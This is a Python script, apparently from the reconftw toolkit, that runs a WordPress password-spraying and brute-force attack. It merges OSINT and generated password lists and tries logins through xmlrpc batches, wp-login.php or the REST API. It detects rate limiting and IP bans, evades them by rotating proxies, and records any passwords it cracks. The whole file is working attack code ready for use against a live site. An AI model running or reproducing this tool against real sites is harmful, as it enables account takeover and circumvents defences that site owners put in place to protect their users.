#!/usr/bin/env python3
"""WordPress spray: priority wordlist (short + osint) then wp-brute-pro smart generation."""
import argparse
import json
import os
import sys
import time
import urllib3

urllib3.disable_warnings()


def parse_args():
    p = argparse.ArgumentParser(description="WP hybrid spray (reconftw)")
    p.add_argument("-u", "--url", required=True, help="Target WordPress URL")
    p.add_argument("-U", "--users", required=True, help="Usernames (comma separated)")
    p.add_argument("--priority-wordlist", required=True, help="Short list + osint passwords (tried first)")
    p.add_argument("--scan-json", help="Prior recon JSON (method auto + login URL)")
    p.add_argument("--method", default="auto", choices=["auto", "xmlrpc", "wplogin", "restapi"])
    p.add_argument("--batch-size", type=int, default=50)
    p.add_argument("--delay", type=float, default=3.0)
    p.add_argument("--max-passwords", type=int, default=0, help="0 = unlimited")
    p.add_argument("--company", help="Company name for wp-brute-pro generator")
    p.add_argument("--keywords", help="Extra keywords for generator")
    p.add_argument("--crawl", action="store_true", help="Crawl target for generator keywords")
    p.add_argument("--output", required=True, help="Output directory")
    p.add_argument("--tool-root", help="wp-brute-pro install path")
    p.add_argument("--proxy-list", help="Proxy list file")
    p.add_argument("--export-json", help="Export results JSON path")
    p.add_argument("--resume", action="store_true")
    p.add_argument("-v", "--verbose", action="store_true", help="Colored TUI with progress bar (wp-brute-pro ui)")
    p.add_argument("--no-color", action="store_true", help="Disable ANSI colors")
    return p.parse_args()


def format_eta(seconds):
    if seconds < 60:
        return f"{int(seconds)}s"
    if seconds < 3600:
        return f"{int(seconds // 60)}m {int(seconds % 60)}s"
    h = int(seconds // 3600)
    m = int((seconds % 3600) // 60)
    return f"{h}h {m}m"


def load_lines(path):
    passwords = []
    if not path or not os.path.isfile(path):
        return passwords
    with open(path, "r", encoding="utf-8", errors="ignore") as handle:
        for line in handle:
            pwd = line.strip()
            if pwd and 3 <= len(pwd) <= 64:
                passwords.append(pwd)
    return passwords


def merge_password_lists(priority, generated, max_passwords):
    merged = []
    seen = set()
    for pwd in priority + generated:
        if pwd in seen:
            continue
        seen.add(pwd)
        merged.append(pwd)
        if max_passwords > 0 and len(merged) >= max_passwords:
            break
    return merged


def pick_method(method, scan_info):
    if method != "auto":
        return method
    if scan_info and scan_info.get("xmlrpc_active"):
        return "xmlrpc"
    if scan_info and scan_info.get("login_url"):
        return "wplogin"
    return "restapi"


def say(verbose, ui_mod, reporter, kind, msg):
    if verbose and ui_mod:
        getattr(ui_mod, kind)(msg)
    elif reporter:
        log_kind = "warning" if kind == "warning" else kind
        if log_kind == "error":
            reporter.error(msg)
        elif log_kind == "warning":
            reporter.warning(msg)
        elif log_kind == "success":
            reporter.success(msg)
        else:
            reporter.info(msg)


def main():
    args = parse_args()
    tool_root = args.tool_root or os.environ.get("WP_BRUTE_TOOL_ROOT", "")
    if not tool_root or not os.path.isdir(tool_root):
        print("wp-brute-pro tool root missing (--tool-root or WP_BRUTE_TOOL_ROOT)", file=sys.stderr)
        return 2

    sys.path.insert(0, tool_root)
    import ui as wp_ui
    from wordlist.generator import generate
    from core.xmlrpc import XmlRpcAttack
    from core.wplogin import WpLoginAttack
    from core.restapi import RestApiAttack
    from core.validator import Validator
    from evasion.throttle import Throttle
    from evasion.proxy import ProxyRotator
    from state.tracker import Tracker
    from output.reporter import Reporter

    if args.no_color:
        wp_ui.disable_colors()

    url = args.url.rstrip("/")
    usernames = [u.strip() for u in args.users.split(",") if u.strip()]
    if not usernames:
        print("No usernames provided", file=sys.stderr)
        return 2

    if not os.path.isfile(args.priority_wordlist):
        print(f"Priority wordlist not found: {args.priority_wordlist}", file=sys.stderr)
        return 2

    if args.verbose:
        wp_ui.banner()

    scan_info = None
    if args.scan_json and os.path.isfile(args.scan_json):
        with open(args.scan_json, "r", encoding="utf-8") as handle:
            scan_info = json.load(handle)
    elif args.verbose:
        wp_ui.warning("No scan.json — method auto may pick restapi instead of xmlrpc")

    if args.verbose:
        wp_ui.header("PHASE 3: WORDLIST (HYBRID)")
        wp_ui.spinner("Generating smart wordlist + merging priority list", 1)

    priority = load_lines(args.priority_wordlist)
    generated = generate(
        usernames=usernames,
        company=args.company or None,
        keywords=args.keywords,
        crawl_url=url if args.crawl else None,
        extra_wordlist=None,
    )
    passwords = merge_password_lists(priority, generated, args.max_passwords)
    if not passwords:
        say(args.verbose, wp_ui, None, "error", "No passwords to try")
        return 2

    method = pick_method(args.method, scan_info)
    if scan_info and scan_info.get("has_captcha") and method == "wplogin" and scan_info.get("xmlrpc_active"):
        method = "xmlrpc"

    out_dir = args.output
    os.makedirs(out_dir, exist_ok=True)
    reporter = Reporter(out_dir)
    tracker = Tracker(out_dir)
    throttle = Throttle(args.delay, args.batch_size)
    validator = Validator(url)
    proxy_rotator = ProxyRotator(proxy_file=args.proxy_list)

    tracker.set_target(url)
    tracker.set_generated(len(passwords))

    summary = (
        f"{len(priority)} priority + {len(generated)} smart-generated "
        f"= {len(passwords)} unique"
    )
    if args.verbose:
        wp_ui.success(f"{len(passwords)} passwords ready ({summary})")
        wp_ui.info(f"Users: {', '.join(usernames)}")
        wp_ui.info(f"Method: {method}")
        if args.max_passwords > 0:
            wp_ui.warning(f"Max passwords cap: {args.max_passwords}")
    reporter.info(f"Hybrid spray: {summary}, method={method}, users={','.join(usernames)}")

    if args.verbose:
        wp_ui.header("PHASE 4: ATTACK")

    attack_start = time.time()

    for username in usernames:
        todo = tracker.filter_new(username, passwords) if args.resume else passwords
        if not todo:
            say(args.verbose, wp_ui, reporter, "info", f"[{username}] all passwords already tried (resume)")
            continue

        total_b = (len(todo) + throttle.batch_size - 1) // throttle.batch_size if method == "xmlrpc" else len(todo)
        say(args.verbose, wp_ui, reporter, "info", f"[{username}] {len(todo)} passwords, {total_b} batches")
        if args.verbose:
            print()

        found = False

        if method == "xmlrpc":
            attacker = XmlRpcAttack(url)
            user_tried = 0
            user_start = time.time()
            for batch_num, start in enumerate(range(0, len(todo), throttle.batch_size), 1):
                batch = todo[start:start + throttle.batch_size]
                status_code, resp_text = attacker.send_batch(username, batch, proxies=proxy_rotator.get_current())

                if status_code == 200:
                    throttle.success()
                    candidate = attacker.parse_response(resp_text, batch)
                    if candidate and validator.verify(username, candidate):
                        if args.verbose:
                            wp_ui.batch_result(batch_num, total_b, user_tried, len(todo), status="candidate")
                            wp_ui.batch_newline()
                        wp_ui.found_password(username, candidate)
                        reporter.found(username, candidate)
                        tracker.mark_found(username, candidate)
                        found = True
                        break
                    user_tried += len(batch)
                elif status_code in (403, 429, 503):
                    penalty = throttle.blocked(status_code)
                    if args.verbose:
                        wp_ui.batch_result(batch_num, total_b, user_tried, len(todo), status="blocked")
                        wp_ui.batch_newline()
                    say(args.verbose, wp_ui, reporter, "warning", f"HTTP {status_code} — waiting {penalty}s")
                    if throttle.is_banned():
                        if proxy_rotator.has_proxies() and proxy_rotator.rotate():
                            throttle.mark_ban()
                            say(args.verbose, wp_ui, reporter, "info", "Rotated proxy after ban")
                            continue
                        say(args.verbose, wp_ui, reporter, "error", "IP banned and no proxies left")
                        break
                    throttle.wait_penalty(penalty)
                    throttle.mark_ban()
                elif status_code < 0:
                    penalty = throttle.timeout()
                    if args.verbose:
                        wp_ui.batch_result(batch_num, total_b, user_tried, len(todo), status="blocked")
                        wp_ui.batch_newline()
                    say(args.verbose, wp_ui, reporter, "warning", f"Connection error — waiting {penalty}s")
                    throttle.wait_penalty(penalty)
                    throttle.mark_ban()
                else:
                    user_tried += len(batch)

                elapsed = time.time() - user_start
                if user_tried > 0 and elapsed > 0:
                    rate = user_tried / elapsed
                    remaining = len(todo) - user_tried
                    eta_str = format_eta(remaining / rate) if rate > 0 else "..."
                else:
                    eta_str = "..."

                if args.verbose:
                    wp_ui.batch_result(
                        batch_num, total_b, user_tried, len(todo), status="miss", eta=eta_str
                    )

                tracker.mark_tried(username, batch)
                tracker.update_user(username, user_tried)
                throttle.wait()

            if args.verbose:
                wp_ui.batch_newline()
            tracker.update_user(username, user_tried, "found" if found else "done")
            if not found:
                say(
                    args.verbose,
                    wp_ui,
                    reporter,
                    "warning",
                    f"{username}: not found ({user_tried} attempts)",
                )

        else:
            login_url = (scan_info or {}).get("login_url") or f"{url}/wp-login.php"
            attacker = WpLoginAttack(login_url) if method == "wplogin" else RestApiAttack(url)
            tried = 0
            user_start = time.time()
            progress_stride = max(1, min(10, len(todo) // 100 or 1))
            for idx, pwd in enumerate(todo):
                result = attacker.try_login(username, pwd)
                tried += 1
                if result is True and validator.verify(username, pwd):
                    if args.verbose:
                        wp_ui.batch_newline()
                    wp_ui.found_password(username, pwd)
                    reporter.found(username, pwd)
                    tracker.mark_found(username, pwd)
                    found = True
                    break
                elif result is None:
                    throttle.timeout()
                    if throttle.is_banned():
                        if args.verbose:
                            wp_ui.batch_newline()
                        say(args.verbose, wp_ui, reporter, "error", "Ban detected")
                        break

                if args.verbose and (idx % progress_stride == 0 or idx == len(todo) - 1):
                    elapsed = time.time() - user_start
                    rate = tried / elapsed if elapsed > 0 else 1
                    remaining = len(todo) - tried
                    eta_str = format_eta(remaining / rate) if rate > 0 else "..."
                    wp_ui.batch_result(
                        idx // progress_stride + 1,
                        max(1, len(todo) // progress_stride),
                        tried,
                        len(todo),
                        status="miss",
                        eta=eta_str,
                    )

                tracker.mark_tried(username, [pwd])
                throttle.wait()

            if args.verbose:
                wp_ui.batch_newline()
            tracker.update_user(username, tried, "found" if found else "done")
            if not found:
                say(
                    args.verbose,
                    wp_ui,
                    reporter,
                    "warning",
                    f"{username}: not found ({tried} attempts)",
                )

        if found:
            break

    if args.verbose:
        print()
        wp_ui.header("PHASE 5: REPORT")
        wp_ui.stats_table([
            ("Total tried", tracker.state.get("total_tried", 0)),
            ("Total generated", tracker.state.get("total_generated", 0)),
            ("Found", len(tracker.state.get("found", []))),
            ("HTTP requests", throttle.stats().get("total_requests", 0)),
            ("Blocks", throttle.stats().get("total_blocks", 0)),
            ("Time", format_eta(time.time() - attack_start)),
        ])

    tracker.save_state()
    reporter.write_report(scan_info, tracker.state, throttle.stats())

    if args.export_json:
        export = {
            "target": url,
            "scan": scan_info,
            "results": tracker.state,
            "throttle": throttle.stats(),
            "mode": "hybrid",
            "priority_count": len(priority),
            "generated_count": len(generated),
            "total_unique": len(passwords),
        }
        with open(args.export_json, "w", encoding="utf-8") as handle:
            json.dump(export, handle, indent=2, ensure_ascii=False)
        if args.verbose:
            wp_ui.success(f"JSON: {args.export_json}")

    if args.verbose:
        wp_ui.info(f"Report: {out_dir}/report.md")
        wp_ui.info(f"Log: {out_dir}/log.txt")

    return 0


if __name__ == "__main__":
    sys.exit(main())
